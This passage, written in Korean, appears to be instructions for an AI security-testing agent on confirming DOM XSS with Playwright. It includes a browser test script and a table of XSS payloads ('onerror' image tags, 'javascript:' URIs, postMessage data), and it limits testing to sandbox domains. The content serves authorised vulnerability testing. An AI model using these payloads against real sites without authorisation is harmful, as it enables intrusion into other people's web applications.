## Phase 2: 동적 테스트 (Playwright 전용)

### 원칙: curl 사용 금지

DOM XSS는 서버가 페이로드를 처리하지 않는다. curl로는 브라우저 JS가 실행되지 않으므로 DOM XSS를 재현할 수 없다. **Phase 2는 반드시 Playwright로만 수행한다.**

curl로 테스트를 대체하거나, curl 응답에서 페이로드 반영 여부를 확인하는 것은 DOM XSS 검증 방법이 아니다. curl 결과로 "확인됨" 또는 "안전"을 판정하지 않는다.

### 테스트 절차

**Step 1: Playwright 스크립트 작성**

각 후보에 대해 아래 구조의 Playwright 스크립트를 작성한다:

```javascript
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  let alertFired = false;
  let alertMessage = '';

  // alert/confirm/prompt 가로채기
  page.on('dialog', async dialog => {
    alertFired = true;
    alertMessage = dialog.message();
    await dialog.dismiss();
  });

  // 세션 쿠키 설정 (인증 필요 시)
  await context.addCookies([
    { name: 'SESSION', value: '<세션값>', domain: '<대상도메인>', path: '/' }
  ]);

  // Source별 페이로드 삽입
  // [location.hash 케이스]
  await page.goto('https://<대상>/path#<페이로드>');

  // [window.name 케이스]
  // await page.evaluate(() => { window.name = '<페이로드>'; });
  // await page.goto('https://<대상>/path');

  await page.waitForTimeout(2000);

  if (alertFired) {
    console.log('XSS 확인됨:', alertMessage);
  } else {
    // DOM 직접 확인
    const dangerous = await page.evaluate(() => {
      return document.body.innerHTML.includes('<img src=x');
    });
    console.log('DOM 삽입 여부:', dangerous);
  }

  await browser.close();
})();
```

**Step 2: 페이로드 선택**

| Source 유형 | 기본 페이로드 | 비고 |
|-------------|-------------|------|
| location.hash | `#<img src=x onerror=alert(document.domain)>` | URL 인코딩 불필요 (hash는 서버로 안 감) |
| location.hash (스크립트 직접) | `#javascript:alert(1)` | href Sink인 경우 |
| window.name | `<img src=x onerror=alert(document.domain)>` | window.open 또는 evaluate로 설정 |
| postMessage | `{"type":"msg","data":"<img src=x onerror=alert(1)>"}` | origin 검증 우회 포함 |
| localStorage | `<img src=x onerror=alert(document.domain)>` | 선행 주입 후 페이지 재방문 |

**Step 3: 실행 및 결과 확인**

```bash
node /tmp/dom_xss_test.js
```

**Step 4: 성공 기준**

| 결과 | 판정 |
|------|------|
| `alert()` 발화 확인 | **확인됨** |
| 페이로드가 이스케이프 없이 DOM에 삽입됨 (예: `innerHTML`에 `<img onerror=...>`) | **확인됨** |
| 페이로드가 DOM에 삽입되지 않거나 이스케이프되어 삽입됨 | 안전 |
| Playwright 실행 실패 (command not found, 설치 오류) | `[도구 한계]` → 메인 에이전트에 위임 |
| 세션 필요 페이지에서 인증 실패 | `[정보 부족]` |

---

## 유의사항

- **Playwright 실행 시도 없이 `[도구 한계]`로 표시하지 않는다.** 실제로 실행했으나 실패한 경우에만 허용된다.
- **DOM 조작이 비동기로 발생하는 경우**: `page.waitForTimeout(2000)` 대신 `page.waitForSelector` 또는 `page.waitForFunction`으로 충분히 대기한다.
- **postMessage Origin 검증 우회**: `targetOrigin` 검증이 없거나 `'*'`인 경우만 취약점으로 분류한다. 발신 origin을 확인하는 코드가 있으면 우회 가능 여부를 코드에서 확인한 뒤 판정한다.
- **`javascript:` URI Sink**: `location.href = userInput`에서 userInput이 `javascript:alert(1)`로 시작할 수 있는 경우 취약점이다. Playwright로 해당 URL을 직접 방문하여 실행 여부를 확인한다.
- **localStorage 경유 2차 공격**: localStorage Source는 다른 XSS가 선행돼야 주입 가능하므로, 독립적인 공격 경로가 아니다. 보고 시 "2차 공격 경로"임을 명시한다.
- 모든 동적 테스트는 sandbox 도메인에서만 수행한다.
- "확인됨"은 Playwright에서 alert 발화 또는 페이로드 DOM 삽입이 직접 확인된 경우에만 부여한다. 코드 분석만으로는 "후보"다.
